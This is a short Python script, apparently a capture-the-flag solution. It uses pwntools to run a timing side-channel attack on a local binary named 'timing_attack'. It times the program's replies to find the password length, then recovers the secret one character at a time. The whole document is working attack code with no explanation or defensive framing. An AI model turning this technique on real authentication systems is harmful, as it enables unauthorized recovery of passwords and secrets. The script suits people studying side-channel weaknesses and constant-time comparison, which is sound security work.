from pwn import *
import datetime

context.binary = "./target/release/timing_attack"
p = process()

largest = datetime.timedelta()
pass_len = 0
for i in range(1, 100):
    x = b"0" * i
    t = datetime.datetime.now()
    p.sendline(x)
    p.recvline()
    d = datetime.datetime.now() - t
    if d > largest:
        largest = d
        pass_len = i

print(f"Largest: {largest.microseconds}ms\nlen: {pass_len}")

known = ""
unknown = "*" * pass_len
last_t = None
i = len(known) + 1

while True:
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
        key = known + c + unknown[i:]
        t = datetime.datetime.now()
        p.sendline(key)
        p.recvline()
        d = datetime.datetime.now() - t
        print(f"{key} {d.microseconds} ({d.microseconds / largest.microseconds})")
        if d.microseconds / largest.microseconds > 1.04:
            known += c
            largest = d
            i += 1
            break
